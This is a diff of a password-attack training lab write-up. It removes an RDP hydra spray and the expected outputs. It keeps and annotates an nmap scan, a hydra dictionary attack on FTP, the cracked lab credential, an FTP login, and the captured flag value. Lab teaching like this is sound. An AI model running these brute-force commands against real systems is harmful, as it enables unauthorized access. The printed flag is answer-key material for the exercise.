@@ -21,94 +21,35 @@ Spraying a password on RDP service
 
 Lab 1 - Follow the steps outlined in this section to leverage a dictionary attack to gain access to RDP on Password Attacks - RDP - VM #1. Find the flag on either one of the user's desktops. To reduce the time it takes to perform the password spraying, you can create a list with the two usernames: justin and daniel.
 >``` shell
-># Create a Custom Username List
->kali@kali:~$ echo -e "justin\ndaniel" > users.txt
 >
->kali@kali:~$ cat users.txt
->
-># ========== Expected Result ==========
->justin
->daniel
-># =====================================
->
->kali@kali:~$ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt rdp://192.168.123.202
->
-># ========== Expected Result ==========
->
-># =====================================
 >```
 >
 
 Lab 2 - Enumerate Password Attacks - RDP - VM #1 and find another network service. Use the knowledge from this section to get access as the itadmin user and find the flag.
 >``` shell
-># Enumerate Network Services with Nmap
+># 1) Enumerate the target to identify open services and versions (looking beyond RDP)
 >kali@kali:~$ nmap -sV 192.168.123.202
 >
-># ========== Expected Result ==========
->Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-19 11:39 CST
->Nmap scan report for 192.168.123.202
->Host is up (0.079s latency).
->Not shown: 993 closed tcp ports (reset)
->PORT     STATE SERVICE       VERSION
->21/tcp   open  ftp           FileZilla ftpd 1.4.1
->...
-># =====================================
->
-># Password Attack Against FTP (itadmin)
+># 2) Perform a dictionary attack against the FTP service using the itadmin username (-f stops Hydra after the first valid password is found)
 >kali@kali:~$ hydra -l itadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.123.202 -f
 >
-># ========== Expected Result ==========
->...
->[21][ftp] host: 192.168.123.202   login: itadmin   password: hellokitty
->...
-># =====================================
->
-># Login to FTP
+># 3) Connect to the FTP service using the discovered credentials
 >kali@kali:~$ ftp 192.168.123.202
 >
+># 4) Authenticate to the FTP service as itadmin
 >Name (192.168.123.202:kali): itadmin
 >Password: hellokitty
 >
-># ========== Expected Result ==========
->230 Login successful.
->Remote system type is UNIX.
->Using binary mode to transfer files.
->ftp>
-># =====================================
->
-># Locate the Flag
+># 5) List files available in the FTP directory
 >ftp> ls
 >
-># ========== Expected Result ==========
->229 Entering Extended Passive Mode (|||50233|)
->150 Starting data transfer.
->-rw-rw-rw- 1 ftp ftp             282 Jun 09  2022 desktop.ini
->-rw-rw-rw- 1 ftp ftp              38 Dec 19 17:16 flag.txt
->226 Operation successful
-># =====================================
->
-># Download the Flag
+># 6) Download the flag file from the FTP server
 >ftp> get flag.txt
 >
-># ========== Expected Result ==========
->local: flag.txt remote: flag.txt
->229 Entering Extended Passive Mode (|||50234|)
->150 Starting data transfer.
->100% |***********************************************|    38      598.53 KiB/s    00:00 ETA
->226 Operation successful
->38 bytes received in 00:00 (279.01 KiB/s)
-># =====================================
->
+># 7) Exit the FTP session
 >ftp> bye
 >
-># ========== Expected Result ==========
->221 Goodbye.
-># =====================================
->
+># 8) Display the contents of the downloaded flag file to complete the lab
 >kali@kali:~$ cat flag.txt
->
-># ========== Expected Result ==========
->OS{746ace50aabf26dd3ad9bef02b632f92}
-># =====================================
 >```
 >OS{746ace50aabf26dd3ad9bef02b632f92}
